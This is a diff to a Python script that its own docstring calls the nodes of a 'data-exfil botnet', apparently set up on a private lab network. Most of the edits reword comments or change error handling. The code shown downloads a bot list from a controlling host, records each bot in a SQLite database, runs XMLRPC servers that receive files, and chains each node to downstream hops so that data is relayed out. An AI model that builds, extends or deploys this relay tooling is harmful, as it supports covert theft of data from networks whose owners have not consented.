@@ -25,6 +25,8 @@ class RequestHandler(SimpleXMLRPCRequestHandler):
     '''
     def __init__(self, ip, port):
         self.server = SimpleXMLRPCServer((ip, port))
+        # This method gives us a way to check
+        # connectivity for clients
         self.server.register_introspection_functions()
         self.server.register_function(self.server_receive_file, 'server_receive_file')
         if not os.path.exists(data_dir):
@@ -70,8 +72,8 @@ def get_next_hops(conn, seq_no):
 
 def create_men_db(conn):
     ### Create a local SQLite3 database and table
-    # to hold the data on exfiltration bots
-    # conn = sql.connect('men.db')
+    # to hold data on exfiltration bots
+    # Connection object comes from the caller
     c = conn.cursor()
     c.execute('drop table if exists men')
     c.execute('create table men(ip text, port text, seq_no integer, active bool)')
@@ -79,21 +81,21 @@ def create_men_db(conn):
     c.close()
 
 def parseXML(url, file='men.xml'):
-    ### Go and get the XML file with the bot data
+    '''Go and get the XML file with the bot data'''
     try:
         # Grab the file and store it locally
         urllib.request.urlretrieve(url, file)
-        # Parse it for processing
+        # Parse it for processing and return it
         tree = etree.parse(file).getroot()
         return tree
     except:
         return None
 
 def store_bot_info(tree, conn):
-    ### Store the data from the XML file in a local database
+    '''Store the data from the XML file in a local SQLite3 database'''
+    # Loop through the XML tree and insert the data for each bot
+    # in the local database pointed to by the conn object
     c = conn.cursor()
-    # Loop through the XML tree and insert the data for each
-    # bot in a local database
     for child in tree:
         data = []
         query = "insert into men values("
@@ -107,6 +109,12 @@ def store_bot_info(tree, conn):
     c.close()
     
 if __name__=='__main__':
+    '''Main functionality for the data-exfil botnet nodes.
+    If this node is not the source, then an XMLRPC server
+    will be created as a child process. If this node is
+    not the sink, then an XMLRPC client object will be
+    created and managed here, as well.
+    '''
     # Get my ip address
     my_ip = get_my_IP()
     #myIP = '10.0.1.243'
@@ -118,11 +126,11 @@ if __name__=='__main__':
     url = 'http://10.0.1.221:82/men.xml'
     tree = parseXML(url)
     if len(tree):
-        # Create/open and populate the men database
+        # Create/open and then populate the men database
         create_men_db(conn)
         store_bot_info(tree, conn)
     else:
-        print('Can\'t reach the server. Using an old copy, if it exists!')
+        print('Can\'t reach the server. Using an old copy, if one exists!')
     # What's my assigned server port number and seq_no?
     my_config = get_my_config(conn, my_ip)
     if my_config == None:
@@ -132,8 +140,7 @@ if __name__=='__main__':
     # At this point, we have all the info 
     # needed to fire up an XMLRPC server
     print('My port number is', my_port, 'and my sequence number is', my_seq_no)
-    # We'll only start a server if my_seq_no != 0
-    # In that case, we only need to start up an XMLRPC client
+    # We'll only start a server if my_seq_no > 0
     server = None
     if my_seq_no > 0:
         try:
@@ -156,10 +163,9 @@ if __name__=='__main__':
     print('My sequence number is', my_seq_no)
     next_hops = get_next_hops(conn, my_seq_no)
     print('The next hops are', next_hops)
-
     # If the return value is None, that means
     # we're the last hop, in which case we
-    # won't be defining a client
+    # won't be defining a client.
     client = False
     if next_hops != None:
         client = True
@@ -170,25 +176,30 @@ if __name__=='__main__':
             server_url = 'http://' + next_hops[hop][0] + ':' + next_hops[hop][1] + '/'
             print('Trying to connect to', server_url)
             try:
-                # The constructor doesn't attempt to connect,
-                # so we have to ask for something to confirm
+                # The client constructor doesn't attempt to connect to the
+                # server, so we have to ask for something to confirm that 
                 # we can actually talk to the server.
                 proxy = xmlrpc.client.ServerProxy(server_url)
                 proxy.system.listMethods()
             except Exception as e:
                 print('ERROR: Unable to connect to downstream server:', e)
+                # errno 111 is 'Connection refused'
                 if(e.errno == 111):
                     time.sleep(default_delay)
-                tries += 1
-                proxy = None
-                if tries >= conn_max_tries:
-                    hop += 1
-                    tries = 0
-                    print('Warning: Client unable to connect to downstream server...', end = ' ')
-                    if tries == 0 and hop >= len(next_hops):
-                        print('no more hops to try!')
-                    else:
-                        print('trying next hop!')
+                    tries += 1
+                    proxy = None
+                    if tries >= conn_max_tries:
+                        hop += 1
+                        tries = 0
+                        print('Warning: Client unable to connect to downstream server...', end = ' ')
+                        if tries == 0 and hop >= len(next_hops):
+                            print('no more hops to try!')
+                        else:
+                            print('trying next hop!')
+                else:
+                    print('ERROR: Not able to connect downstream server:', e)
+                    print('Exiting...')
+                    sys.exit(1)
                 continue
             break
         if proxy == None:
